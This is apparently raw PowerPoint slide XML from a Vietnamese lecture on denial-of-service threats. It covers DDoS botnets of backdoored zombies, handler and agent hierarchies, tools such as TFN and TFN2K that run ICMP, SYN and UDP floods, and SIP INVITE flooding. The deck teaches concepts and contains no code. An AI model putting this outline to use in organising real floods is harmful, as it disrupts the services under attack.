              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C83E677A-B176-4444-87D2-CA125ABF5D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08179" y="2095777"/>
            <a:ext cx="4847189" cy="2968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03914213"/>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7742ECB1-9388-4F6E-AC03-5D3E82D8663A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS gián tiếp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12291" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1CCA355B-1ED7-476F-82A8-0304D09C4485}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="605183" y="1600200"/>
            <a:ext cx="8915400" cy="4953000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="8" name="Diagram 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{499B0D13-7C96-4A4E-A907-D26BEBF8BC15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2078831280"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1371600" y="2362200"/>
          <a:ext cx="9144000" cy="3124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18066946"/>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C04724D7-2851-4079-BDEE-B94104B9E3DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3200"/>
              <a:t>Tấn công DDoS</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="en-US" sz="3200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26627" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C17BDE6-44CA-4233-9F6C-527A9504778C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1638300" y="1676400"/>
            <a:ext cx="8915400" cy="4876800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Hạn chế l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>u l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ợng nếu sử dụng một nguồn đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>n</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Nhiều hệ thống cho phép l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>u lượng traffic cao hơn nhiều để tạo thành một tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>DDoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Thường các máy tính có điểm yếu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> Zombies với các chương trình backdoor được cài đặt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> Hình thành một botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Ví dụ DDoS tools: Tribe Flood Network (TFN), TFN2K</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Thực hiện ICMP, SYN, UDPF và ICMP floods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> agent là một Trojan trên các zombie, thực hiện một số chức năng rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> handler: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>command-line program, IRC server, IM server, web-based HTTP server</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1892204260"/>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6AD453F7-7A69-48B2-8FE1-CF4D9490764D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3200"/>
              <a:t>Tấn công DDoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28675" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29E14D9C-2148-41E5-A719-DE821686AC0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265" t="14702" r="10720" b="50594"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1295400" y="1620289"/>
            <a:ext cx="9372600" cy="4856711"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70195"/>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6" name="TextBox 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6087A9F9-5EB9-4C36-9983-9555B3B88FB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="45205" y="1600200"/>
            <a:ext cx="5467331"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80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="–"/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buChar char="»"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Phân cấp quản lý DDoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kẻ tấn công gửi một lệnh đến handler zombie;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Handler chuyển tiếp đến handler, agent khác</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3659034681"/>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712C0843-1F58-4706-9628-2CF9D3EF6AF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3000"/>
              <a:t>Tấn công băng thông dựa trên ứng dụng</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30723" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB7A580E-FA49-4F6B-8FEC-28F5C7FECC7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Buộc các hệ thống nạn nhân thực hiện các hoạt động tiêu thụ tài nguyên (ví dụ, tìm kiếm, truy vấn DB phức tạp)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>VoIP Session Initiation Protocol (SIP): Kẻ tấn công gửi nhiều INVITE request; đặt gánh nặng lớn trên các proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>tài nguyên máy chủ bị cạn kiệt trong khi xử lý yêu cầu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>dung lượng băng thông bị tiêu thụ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30724" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78AD16F4-7D3C-485B-83EB-E5E9DEB9806D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5353050" y="6356351"/>
            <a:ext cx="23114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80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="–"/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buChar char="»"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3925765638"/>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3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09C81170-B260-4226-9E48-4EC0A460EA7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800600" y="1600200"/>
            <a:ext cx="5563803" cy="4964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7" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B9305BD-B17E-4C20-95D3-B3D72447EBC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3000"/>
              <a:t>Tấn công băng thông dựa trên ứng dụng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{215C45FA-7449-473E-A52B-8FB8E3B8F98B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1752600"/>
            <a:ext cx="3952875" cy="4419600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>SIP Flooding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>giao </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>thức chuẩn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>cho điện thoại VoIP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>giao thức dựa trên văn bản với một cú pháp tương tự như HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Có hai loại thông điệp SIP: yêu cầu và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>phản hồi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="58570123"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{93CC16E3-1D50-46C7-A834-6CA3AA26E602}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
